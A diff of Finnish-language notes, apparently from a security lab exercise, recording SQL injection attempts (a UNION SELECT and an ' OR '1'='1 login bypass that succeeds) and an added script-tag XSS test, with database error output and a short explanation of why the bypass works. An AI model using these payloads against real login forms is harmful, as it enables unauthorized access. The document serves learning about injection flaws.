@@ -9,10 +9,12 @@ Virhe: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error
 ' UNION SELECT * FROM käyttäjät WHERE käyttäjä = 'seppo' --
 Virhe: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'UNION SELECT * FROM käyttäjät WHERE käyttäjä = 'seppo' --', '' UNION SE...' at line 1
 
+<script>alert('Hacked noob');</script>
+Virhe: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'Hacked noob');', '', '2026-05-13', 2)' at line 1
+
 käyttäjä: admin ' OR '1' = '1
 salasana: admin ' OR '1' = '1
 Pääsin sisään ilman oikeita tunnuksia
-
 
 Mitä pellin alla tapahtuu, miksi hyökkäys onnistui?
 Koodi palauttaa aina TRUE, koska yksi on aina yksi eli TRUE. Koodia ei siis ole suojattu sql-injektiolta. Sen takia käyttäjä jolla ei ole oikeita tunnuksia pääsee ohjelmaan sisälle.
